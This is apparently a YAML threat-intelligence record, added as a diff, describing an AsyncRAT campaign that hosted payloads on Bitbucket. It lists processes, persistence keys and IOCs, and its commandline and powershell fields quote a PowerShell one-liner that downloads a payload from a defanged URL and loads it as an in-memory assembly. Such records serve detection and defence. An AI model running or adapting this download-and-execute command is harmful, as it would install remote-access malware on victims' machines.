@@ -1,0 +1,58 @@
+description: Attackers are leveraging Bitbucket repositories to host malicious payloads,
+  specifically AsyncRAT. The attack chain involves a VBScript that obfuscates and
+  executes a PowerShell command to download and execute the payload.
+attribution: Unknown
+malware_families:
+- AsyncRAT
+- Predator stealer
+- Azorult stealer
+- STOP ransomware
+TTPs:
+  processes:
+  - wscript.exe
+  - powershell.exe
+  - RegSvcs.exe
+  commandline:
+  - C:\Windows\System32\wscript.exe "01 DEMANDA LABORAL.vbs"
+  - powershell.exe -command "& {Invoke-WebRequest -Uri \"hxxps://bitbucket[.]org/jaiprrfc/sds/downloads/envio4sep[.]txt\"
+    -OutFile dllhope.txt;  $bytes = [System.IO.File]::ReadAllBytes(\"dllhope.txt\");
+    $assembly = [System.Reflection.Assembly]::Load($bytes); [System.AppDomain]::CurrentDomain.Load([System.Reflection.AssemblyName]::new(\"ClassLibrary3,
+    Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\")); }"
+  - C:\Windows\system32\RegSvcs.exe
+  powershell:
+  - '& {Invoke-WebRequest -Uri "hxxps://bitbucket[.]org/jaiprrfc/sds/downloads/envio4sep[.]txt"
+    -OutFile dllhope.txt;  $bytes = [System.IO.File]::ReadAllBytes("dllhope.txt");
+    $assembly = [System.Reflection.Assembly]::Load($bytes); [System.AppDomain]::CurrentDomain.Load([System.Reflection.AssemblyName]::new("ClassLibrary3,
+    Version=1.0.0.0, Culture=neutral, PublicKeyToken=null")); }'
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - process: ClassLibrary3.dll
+    library: system.AppDomain
+  network_connections:
+  - executable: powershell.exe
+    destination: hxxps://bitbucket[.]org/jaiprrfc/sds/downloads/envio4sep[.]txt
+    port: ''
+  file_modifications:
+  - dllhope.txt
+  - xx1.ps1
+  - xx2.vbs
+  - PdjLvfa.lnk
+  persistence:
+  - Registry Run Key (HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run)
+  - Startup Folder Shortcut
+  pipes: []
+  process_relations:
+  - wscript.exe -> powershell.exe
+  - powershell.exe -> RegSvcs.exe
+IOCs:
+- hxxps://bitbucket[.]org/jaiprrfc/sds/downloads/envio4sep[.]txt
+- 01 DEMANDA LABORAL.vbs
+- dllhope.txt
+- ClassLibrary3.dll
+authors:
+- Lovely Antonio
+- Lance GoWe
+reference: https://www.gdatasoftware.com/blog/2024/10/38043-asyncrat-bitbucket
+date_of_publication: October 10, 2024
+file_creation_date: May 19, 2025
